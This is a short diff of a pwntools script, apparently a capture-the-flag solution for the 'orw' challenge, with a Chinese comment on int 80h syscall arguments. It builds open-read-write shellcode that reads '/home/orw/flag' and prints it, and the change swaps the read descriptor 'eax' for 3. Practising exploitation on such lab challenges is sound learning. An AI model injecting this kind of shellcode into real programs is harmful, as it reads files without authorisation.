@@ -4,7 +4,7 @@ from pwn import *
 sc = shellcraft.pushstr("/home/orw/flag")
 # 下面几个函数调用都是通过int 80h调用的，其中三个参数分别为ebx,ecx,edx
 sc += shellcraft.open("esp",0,0)
-sc += shellcraft.read("eax","esp",100)
+sc += shellcraft.read(3,"esp",100)
 sc += shellcraft.write(1,"esp",100)
 sc = asm(sc)
 
